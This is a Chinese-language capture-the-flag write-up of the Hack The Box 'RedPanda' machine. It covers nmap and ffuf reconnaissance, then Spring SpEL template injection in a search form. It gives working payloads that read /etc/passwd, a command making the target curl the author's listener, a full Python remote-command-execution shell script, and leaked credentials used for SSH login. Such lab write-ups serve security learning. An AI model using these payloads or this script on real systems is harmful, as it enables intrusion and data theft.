<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>RedPanda - Hackthebox - 未做提权 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - RedPanda靶场信息  靶场类型  信息收集Nmapnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170  Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-23 09:15 CST Nmap scan report for 10.10.11.170 Host is">
<meta property="og:type" content="article">
<meta property="og:title" content="RedPanda - Hackthebox - 未做提权">
<meta property="og:url" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - RedPanda靶场信息  靶场类型  信息收集Nmapnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170  Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-23 09:15 CST Nmap scan report for 10.10.11.170 Host is">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/8adaa92c-602e-42fe-a8fa-e1863d6e2ae5.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/45267983-d5ed-40f3-bef8-d71fa254d799.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/a7ebd7aa-1c3b-4c70-b6c9-63ce5956683f.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/6f01e1b9-e0a8-4fc6-8c28-438269d664bb.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/2c7be7c5-fe4a-4b5d-881d-22eeb5ba5b62.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/540af504-b13c-4b6a-a98b-d6a92002d03d.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/44829a99-86a7-4024-aec1-c6e32b78076e.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/fe9949f6-3343-42b1-9040-d1fbf4faefbb.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/67d0bdba-da91-4208-ab6f-879ed82d7b3f.png">
<meta property="article:published_time" content="2022-10-24T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:49:39.306Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/8adaa92c-602e-42fe-a8fa-e1863d6e2ae5.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">RedPanda - Hackthebox - 未做提权</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">RedPanda - Hackthebox - 未做提权</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-10-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-10-24
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-RedPanda"><span class="post-toc-text">Hackthebox - RedPanda</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-RedPanda"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">RedPanda - Hackthebox - 未做提权</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-10-24 19:38:36" datetime="2022-10-24T11:38:36.000Z"  itemprop="datePublished">2022-10-24</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-RedPanda"><a href="#Hackthebox-RedPanda" class="headerlink" title="Hackthebox - RedPanda"></a>Hackthebox - RedPanda</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/8adaa92c-602e-42fe-a8fa-e1863d6e2ae5.png" class>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/45267983-d5ed-40f3-bef8-d71fa254d799.png" class>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 09:15 CST
Nmap scan report for 10.10.11.170
Host is up (0.41s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 23 Oct 2022 01:16:00 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;meta author=&quot;wooden_k&quot;&gt;
|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/panda.css&quot; type=&quot;text/css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot; type=&quot;text/css&quot;&gt;
|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;div class=&#39;pande&#39;&gt;
|     &lt;div class=&#39;ear left&#39;&gt;&lt;/div&gt;
|     &lt;div class=&#39;ear right&#39;&gt;&lt;/div&gt;
|     &lt;div class=&#39;whiskers left&#39;&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;/div&gt;
|     &lt;div class=&#39;whiskers right&#39;&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;/div&gt;
|     &lt;div class=&#39;face&#39;&gt;
|     &lt;div class=&#39;eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 23 Oct 2022 01:16:01 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 23 Oct 2022 01:16:02 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/23%Time=635495D0%P=arm-apple-darwin21.5.0%
SF:r(GetRequest,690,&quot;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;ch
SF:arset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sun,\x2023\x20Oct
SF:\x202022\x2001:16:00\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x2
SF:0html&gt;\n&lt;html\x20lang=\&quot;en\&quot;\x20dir=\&quot;ltr\&quot;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\
SF:x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=\&quot;w
SF:ooden_k\&quot;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https://co
SF:depen\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;sty
SF:lesheet\&quot;\x20href=\&quot;css/panda\.css\&quot;\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x2
SF:0\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/main\.css\&quot;\x20type=\&quot;te
SF:xt/css\&quot;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\
SF:x20with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\
SF:x20\x20\x20\x20&lt;div\x20class=&#39;pande&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20
SF:class=&#39;ear\x20left&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;ear\
SF:x20right&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;whiskers\x20le
SF:ft&#39;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x
SF:20\x20\x20\x20&lt;div\x20class=&#39;whiskers\x20right&#39;&gt;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x
SF:20&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;face&#39;&gt;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20&lt;div\x20class=&#39;eye&quot;)%r(HTTPOptions,75,&quot;HTTP/1\.1\x202
SF:00\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x
SF:20Sun,\x2023\x20Oct\x202022\x2001:16:01\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n&quot;)%r(RTSPRequest,24E,&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20t
SF:ext/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2
SF:0435\r\nDate:\x20Sun,\x2023\x20Oct\x202022\x2001:16:02\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;tit
SF:le&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;styl
SF:e\x20type=\&quot;text/css\&quot;&gt;body\x20{font-family:Tahoma,Arial,sans-serif;}\x
SF:20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20
SF:h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:
SF:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{h
SF:eight:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h
SF:1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/
SF:html&gt;&quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=40350%PV=Y%DS=2%DC=T%G=Y%TM=635496
OS:14%P=arm-apple-darwin21.5.0)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M53
OS:9ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   537.83 ms 10.10.14.1
2   537.94 ms 10.10.11.170

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.28 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/a7ebd7aa-1c3b-4c70-b6c9-63ce5956683f.png" class>

<p>挺可爱一小熊猫，还会眨眼睛</p>
<p>在下面有个搜索框，随便搜点东西看看</p>
<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/6f01e1b9-e0a8-4fc6-8c28-438269d664bb.png" class>

<p>看着交互界面，确实会去数据库进行交互查询，这种潜意识就觉得可能会有注入</p>
<p>没测试出什么东西，去 fuzz 试试吧</p>
<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash"> lucifiel@MacBookPro  ~  ffuf -u &#39;http://10.10.11.170:8080/FUZZ&#39; -w /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 200

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.170:8080/FUZZ
 :: Wordlist         : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

stats                   [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 619ms]
error                   [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 617ms]
search                  [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 616ms]
                        [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 401ms]
:: Progress: [30000/30000] :: Job [1/1] :: 8724 req/sec :: Duration: [0:00:41] :: Errors: 10271 ::
</code></pre>
<p>有一个 stats 目录，去看一下</p>
<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/2c7be7c5-fe4a-4b5d-881d-22eeb5ba5b62.png" class>

<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/540af504-b13c-4b6a-a98b-d6a92002d03d.png" class>

<p>这边发现了一些图片，去尝试读取试试</p>
<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/44829a99-86a7-4024-aec1-c6e32b78076e.png" class>

<p>这里提示确实是有注入的，不过有一说一，这图片确实挺有意思的</p>
<p>不过既然 sql 注入不行，那就试试 ssti 呗，反正可以确定漏洞在于注入了</p>
<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/fe9949f6-3343-42b1-9040-d1fbf4faefbb.png" class>

<p>测试出来了 语法是 *{7*7}，把 ssti 语句中的 $ 替换为 * 即可绕过</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我们通过 nmap 的扫描结果可得知，这个网站使用的是 Spring Boot，所以可以确定是一个 java 的程序</p>
<p>所以我们去 ssti 的利用语句里找一下</p>
<blockquote>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty</a></p>
</blockquote>
<pre><code class="bash">*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
</code></pre>
<pre><code class="bash">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
</code></pre>
<p>成功读取到 &#x2F;etc&#x2F;passwd 文件</p>
<p>虽然可以了，但是转换格式还是有点麻烦，所以我又找到了一篇文章</p>
<blockquote>
<p><a href="https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md" target="_blank" rel="noopener">https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md</a></p>
</blockquote>
<pre><code class="bash">*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)}
</code></pre>
<img src="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/67d0bdba-da91-4208-ab6f-879ed82d7b3f.png" class>

<p>直接执行似乎会提示错误，去开一个 http 服务试试</p>
<pre><code class="bash">python3 -m http.server 80
</code></pre>
<p>然后改一下指令，来请求试试</p>
<pre><code class="bash">*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://10.10.14.2&quot;)}
</code></pre>
<pre><code class="bash"> lucifiel@MacBookPro  ~  python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.170 - - [23/Oct/2022 10:02:07] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre>
<p>直接搞个 rce 脚本吧</p>
<pre><code class="python">#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup


print(&quot;&quot;&quot;
 __          __    __       ______     __      _______     __      _______     __      
|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |     
|  |        |  |  |  |    |  ,----&#39;   |  |    |  |__      |  |    |  |__      |  |     
|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |     
|  `----.   |  `--&#39;  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.
|_______|    \______/      \______|   |__|    |__|        |__|    |_______|   |_______|

&quot;&quot;&quot;)
class RCE(Cmd):
    prompt = &quot;\033[1;31m$\033[1;37m &quot;
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = &quot;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&quot; % decimales[0]

        for i in decimales[1:]:
            payload += &quot;.concat(T(java.lang.Character).toString({}))&quot;.format(i)

        payload += &quot;).getInputStream())}&quot;
        data = { &quot;name&quot;: payload }
        requer = requests.post(&quot;http://10.10.11.170:8080/search&quot;, data=data)
        parser = BeautifulSoup(requer.content, &#39;html.parser&#39;)
        grepcm = parser.find_all(&quot;h2&quot;)[0].get_text()
        result = grepcm.replace(&#39;You searched for:&#39;,&#39;&#39;).strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print(&quot;%s: command not found&quot; % (args))

RCE().cmdloop()
</code></pre>
<pre><code class="bash"> lucifiel@MacBookPro  ~/Desktop  python3 exploip.py

 __          __    __       ______     __      _______     __      _______     __
|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |
|  |        |  |  |  |    |  ,----&#39;   |  |    |  |__      |  |    |  |__      |  |
|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |
|  `----.   |  `--&#39;  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.
|_______|    \______/      \______|   |__|    |__|        |__|    |_______|   |_______|


$ whoami
woodenk
$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
</code></pre>
<p>可以成功执行，但是还是没有 shell 方便，先去看看有没有什么可以拿到 shell 的东西吧</p>
<p>在文件 <code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code> 中，找到了一段凭证</p>
<pre><code class="bash">conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
</code></pre>
<pre><code class="bash">username = woodenk
password = RedPandazRule
</code></pre>
<pre><code class="bash"> lucifiel@MacBookPro  ~/Desktop  ssh woodenk@10.10.11.170
woodenk@10.10.11.170&#39;s password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

